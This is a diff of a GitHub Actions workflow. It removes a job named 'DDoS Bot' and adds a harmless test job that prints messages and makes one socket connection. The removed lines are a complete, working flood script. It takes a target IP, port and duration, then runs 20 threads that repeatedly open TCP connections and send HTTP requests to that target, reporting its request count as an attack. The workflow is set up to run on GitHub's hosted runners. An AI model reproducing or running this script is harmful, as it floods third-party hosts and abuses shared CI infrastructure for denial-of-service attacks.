@@ -1,65 +1,23 @@
-name: DDoS Bot
-on:
-  workflow_dispatch:
-    inputs:
-      ip:
-        description: 'Target IP'
-        required: true
-        default: '1.1.1.1'
-      port:
-        description: 'Target Port'
-        required: true
-        default: '80'
-      duration:
-        description: 'Duration in seconds'
-        required: true
-        default: '10'
-
+name: Test Bot
+on: workflow_dispatch
 jobs:
-  attack:
+  test:
     runs-on: ubuntu-latest
     steps:
-    - name: Run Attack
+    - name: Test
+      run: echo "Hello World"
+    - name: Test Python
+      run: python3 -c "print('Python works')"
+    - name: Test Socket
       run: |
         python3 << "END"
 import socket
-import threading
-import time
-
-# Get inputs
-target = "${{ github.event.inputs.ip }}"
-port = ${{ github.event.inputs.port }}
-duration = ${{ github.event.inputs.duration }}
-
-print(f"🎯 Target: {target}:{port}")
-print(f"⏱️ Duration: {duration} seconds")
-
-count = 0
-
-def attack():
-    global count
-    end_time = time.time() + int(duration)
-    while time.time() < end_time:
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(1)
-            s.connect((target, int(port)))
-            s.send(b'GET / HTTP/1.1\r\n\r\n')
-            s.close()
-            count += 1
-        except:
-            pass
-
-# Start threads
-threads = []
-for i in range(20):
-    t = threading.Thread(target=attack)
-    t.start()
-    threads.append(t)
-
-# Wait for all threads
-for t in threads:
-    t.join()
-
-print(f"✅ Attack finished. Requests: {count}")
+try:
+    s = socket.socket()
+    s.settimeout(2)
+    s.connect(('1.1.1.1', 80))
+    print('✅ Socket connection successful')
+    s.close()
+except Exception as e:
+    print(f'❌ Error: {e}')
 END
